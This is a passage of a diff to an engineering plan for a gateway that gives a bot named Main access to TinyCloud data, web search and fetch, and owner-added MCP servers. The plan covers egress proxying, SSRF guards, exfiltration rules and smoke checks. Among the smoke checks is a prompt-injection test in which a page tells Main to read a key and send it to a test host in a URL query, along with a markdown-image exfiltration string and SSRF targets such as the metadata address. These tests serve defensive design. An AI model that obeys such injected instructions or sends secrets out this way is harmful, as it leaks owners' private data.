+What is borrowed: its default-deny per-tool MCP allowlist, argument conditions and `tools/list` filtering are copied into
+the gateway's rules (parse JSON-RPC whatever the `Content-Type`, reject batches). In every case the dial-out hop has a
+network of its own without ingress, fails closed, is reached only by `bots-gateway`, and the gateway keeps its own guard
+and all per-owner secrets. Revisit iron-proxy if bots ever need raw package or `curl` access; it would then sit behind
+the gateway.
+
+Spike before phase 3, Smokescreen first (1 to 2 days, throwaway CVM or locally; items 4 and 6 apply only if iron-proxy
+is evaluated too, the rest apply to either):
 1. The gateway's HTTP client reaches a test origin through the proxy's CONNECT listener, first in `sni-only`
    passthrough and then, if interception is wanted, with the proxy's CA, streaming an SSE response without buffering,
    and an MCP Streamable HTTP server through it. Decide MITM or passthrough here.
@@ -491,69 +571,75 @@ iron-proxy, the rest apply to either):
 7. With the proxy stopped, a fetch is refused and nothing goes direct; from any container but the gateway (one on the
    same compose project, one on the host network) the tunnel is unreachable.
 8. The log carries no fetched path or query in the form we ship, and the 30 s header timeout is raised and exercised.
+9. Smokescreen: a metadata, private, CGNAT, Docker-subnet and tunnelled-IPv4 target is refused by default or with the
+   configured list; the gateway authenticates to it (mTLS) and a second container without the client certificate is
+   refused; its ACL names only the gateway.
+10. Whether Bun's `fetch` can connect to a checked address with the original host in SNI (the gateway's own guard needs
+    it); if not, the guard uses a small resolver-pinning dialer.
 
 ## Build order
 
-0. **Precondition: decision 2.** No phase builds the TinyCloud grant path before the hosted MCP gives Main separate
-   tenant state (or keys tenants by subject and client). Decision 1 (OpenKey's warning and per-permission reject) gates
-   the approval copy, not the build.
+0. **Precondition: decision 2.** No phase builds the TinyCloud grant path before the hosted MCP gives Main its own
+   service identity, credential, tenant namespace and grant ceiling (section 2). None of that exists today.
 1. **TinyCloud MCP.** Builds the shared parts the others reuse: the `/v1/mcp` route and JSON-RPC rebuild, the grant
-   store and admin-socket hand-off, the budget ledger, the count-only audit, the settings surface and the owner events.
-2. **Web.** Adds the guarded fetcher (the SSRF guard is its own module with its own tests, and is the piece phase 3
-   reuses), the provider adapter and the web tools. Waits on the provider decision.
-3. **Owner-added servers.** Adds the server registry, discovery, the credential flows, tool pinning and the settings
-   list. The guard from phase 2 is a prerequisite, so this cannot be built before it.
+   hand-off through the backend, the budget ledger, the count-only audit, the settings surface and the owner events.
+2. **Web.** Adds the vendor adapter (Tavily Search and Extract), the web tools, the URL checks and the exfil rule with
+   its conversation mark. They ship together: this phase is what completes private data, untrusted content and a way
+   out. The reply-rendering rule ships no later than this phase. Waits on the provider decision (key, Extract
+   coverage).
+3. **Owner-added servers.** Adds the server registry, discovery, the credential flows with their bindings, tool pinning,
+   the settings list, the dial guard (its own module with its own tests) and the Smokescreen hop. The egress spike runs
+   before it starts.
 
-The egress spike (above) runs before phase 3 starts and decides the dial-out hop for owner-added servers. The gateway's
-own guard is built in phase 2 whatever it decides. Each phase
-ships behind the existing test-account flag and does not change the others.
+The gateway's own guard is always built, whatever the spike decides. Each phase ships behind the existing test-account
+flag and does not change the others.
 
 ## Decisions for the owner of each system (named, not designed here)
 
-1. **OpenKey** (its owner decides): how a bot requester appears on the approval screen: the 1-hour one-off as the
-   default and the 7-day renewing choice behind a warning; a "Reject this permission" control. The approval screen on
-   main today has a request-level decline and a "belongs to another user" note and no per-permission reject, and the
-   MCP's delegation approval goes through the `/delegate` link flows, which show no extra warning (the draft that adds
-   one does not cover them: the #538 security review confirmed it). This plan depends on this and the owner copy makes no claim about it until it
-   exists. Also the OAuth client and the name shown ("Main, TinyCloud One").
-2. **Hosted MCP** (js-sdk `packages/mcp`). **A build precondition, not an option.** Delegations are stored per tenant,
-   keyed by the OpenKey subject only, so Main would use any delegation the owner approved for another MCP client, and
-   what Main's flow approves would become usable by those clients. Main needs its own restricted MCP address with
-   separate tenant state, or an MCP that keys tenants by subject and client. Separately: production delegations are 30
-   days and cannot be revoked early (TC-1156), and the native grant path accepts one fixed shape, so the 1-hour and
-   7-day windows are token-only until the MCP honours a requested expiry (or Main's address issues shorter
-   delegations). A new address is a new OpenKey audience and callback as well, so it joins decision 1.
-3. **What "one task" means.** This plan ends the grant when Main's turn settles. If a follow-up message should reuse it,
-   say so before build.
-4. **Search provider and its key** (a paid credential, so not added without an explicit decision): which of Tavily,
-   Brave, Exa, Kagi or self-hosted SearXNG, and a dedicated key for the bots service.
+1. **OpenKey** (its owner decides): the native path does not depend on it. It matters for the OAuth fallback and for any
+   later approval screen: how a bot requester appears, the 1-hour one-off as the default and a renewing choice behind
+   a warning, and a "Reject this permission" control. The `/delegate` link flows show no extra warning today (the #538
+   security review confirmed that ticket and link flows skip both the warning and the share rule). The owner copy makes
+   no claim about either until it exists.
+2. **Hosted MCP** (js-sdk `packages/mcp`). **A build precondition, not an option.** For Main, its own service DID,
+   credential and tenant namespace; a grant ceiling the owner picks (spaces, prefixes, databases, read only) with the
+   read tools in section 3 for that identity; and a replace rule so a shorter grant can follow a longer one. Without
+   them Main would collide with the transcript grant and the gateway's credential would reach every owner who granted
+   the backend (section 2). Production delegations are 30 days at most and a native grant has no revoke route, so the
+   signed expiry is the only early end.
+3. **What "one task" means.** This plan ends the grant's use when Main's turn settles. If a follow-up message should
+   reuse it, say so before build.
+4. **Search provider key** (a paid credential): Tavily on the backend's existing account is proposed. Decide whether the
+   plan covers Extract, and whether the bots service gets its own key under that account or shares the backend's.
 5. **The exfil rule for phase 2 (pick one).** It applies to any conversation whose context holds owner data (not just
-   the task that read it) and to web fetch, web search and every owner-added server's tool arguments: (a) no open fetch
-   and no owner-added server calls (recommended start); (b) fetch only through a gateway-built search call with the
-   query shown or capped at 200 characters, plus owner-typed and search-returned URLs, and owner-added server calls
-   blocked; or (c) the owner confirms each new domain and each owner-added server. Without one of these, phase 2 is an
-   exfiltration path whatever the egress layer does. See Web access.
+   the task that read it) and to web fetch, web search and every owner-added server's tool arguments: (a) strict, all
+   refused; (b) narrowed, recommended: search with a capped query, fetch only of search-returned or owner-typed URLs,
+   owner-added server calls refused; or (c) the owner confirms each new domain and each owner-added server. Outbound
+   writes need the owner's approval under all three. Without one of these, phase 2 is an exfiltration path whatever the
+   egress layer does. See Web access.
 6. **Web access has no expiry** (it carries no owner authority). With the exfil rule above in place, "until I turn it
    off" is acceptable; say so if it should expire like the data grants.
-7. **Egress layer.** The plan's recommendation: no iron-proxy for phases 1 and 2; for phase 3 a dedicated dial-out hop
-   (Smokescreen preferred, iron-proxy the alternative) chosen after a spike. Or build the guard in the gateway only.
-   Whichever, the gateway keeps its own checks and the per-owner tokens.
+7. **Egress layer.** No iron-proxy now; phases 1 and 2 need no outbound hop; phase 3 uses Smokescreen after a spike, or
+   the gateway's guard alone if the spike says so. Whichever, the gateway keeps its own checks and the per-owner secrets.
+8. **Reply rendering** (TinyChat frontend): text the model wrote never loads remote images or auto-links, on any
+   surface. See Web access.
 
 ## Smoke check for a later build
 
 On a flagged test account:
 - **TinyCloud:** approve "Just for this task" on one app, ask Main to list that app's keys (they come back); ask it to
-  read another app (refused by the node); after the turn, a second call is `grant_ended`; Disconnect during a 7-day grant
-  and the next call fails; a write tool is `tool_not_permitted`.
-- **Isolation and binding:** with another MCP client's delegation already approved for the same owner, Main still gets
-  `authority_required` (it cannot use it), and what Main's flow approves is refused when a second client calls. A
-  callback with a missing, reused or mismatched `state` (another user or another bot) is rejected, and a code from a
-  different OpenKey account fails with `owner_mismatch` and leaves no grant. Disconnect also removes the refresh-token
-  file. `GET` and `DELETE` on `/v1/mcp` return 405 and no reply carries `Mcp-Session-Id`.
-- **Web:** a fetch of a public page returns text; `http://127.0.0.1`, `http://169.254.169.254`, a name that resolves to a
-  private address, and a redirect to either are each refused and counted as `blocked_address`; a 2 MiB page is cut; a
-  PDF is `wrong_type`; the 21st fetch in a task is `budget`. With a page that tells Main to read a key and fetch
-  `https://<test host>/?d=<value>`, the chosen exfil rule holds: the test host receives no request carrying the value.
+  read another app (refused by the node); once the window is over, a call is `grant_ended`; Disconnect during a 7-day
+  grant and the next call fails at the gateway; a write tool is `tool_not_permitted`.
+- **Isolation and binding:** with the backend's transcript grant already in place for the same owner, Main's grant
+  neither replaces nor shares it, and Main cannot read the connectors data through it; the gateway's service credential
+  is refused for the backend's grants. A delegation signed for another delegate or by another user is refused by the
+  backend (`wrong_delegatee`, `wrong_delegator`), and the node refuses a read outside the signed permissions. `GET` and
+  `DELETE` on `/v1/mcp` return 405 and no reply carries `Mcp-Session-Id`.
+- **Web:** a search returns results; a fetch of a public URL returns text; `http://127.0.0.1`,
+  `http://169.254.169.254`, a bare IP and a URL with user info are each refused before any call and counted as
+  `blocked_url`; a 2 MiB page is cut to 40,000 characters; the 21st fetch in a task is `budget`. With a page that tells
+  Main to read a key and fetch `https://<test host>/?d=<value>`, the chosen exfil rule holds: the test host receives no
+  request carrying the value.
 - **Owner-added server** (a local test server): the tool list shows; an unselected tool is refused; changing a tool's
   description withholds it; Remove ends the next call.
 - **Owner-added server, more:** a server whose discovery names an authorization server on another site makes the add
@@ -562,5 +648,7 @@ On a flagged test account:
   supervisor logs for it: it must not appear.
 - **Conversation taint:** after a TinyCloud read, finish the task and start another with no grant-bearing call; the
   chosen exfil rule still applies to fetch, search and owner-added server calls until the conversation is reset.
+- **Replies:** while marked and not, a reply containing `![x](https://<test host>/?d=1)` loads nothing from the test
+  host in a real browser on every surface that shows it, and a link shows its host and opens only on a tap.
 - **Everywhere:** the sandbox's environment, filesystem and a captured request contain no token or key. Report a mock run
   as a mock.
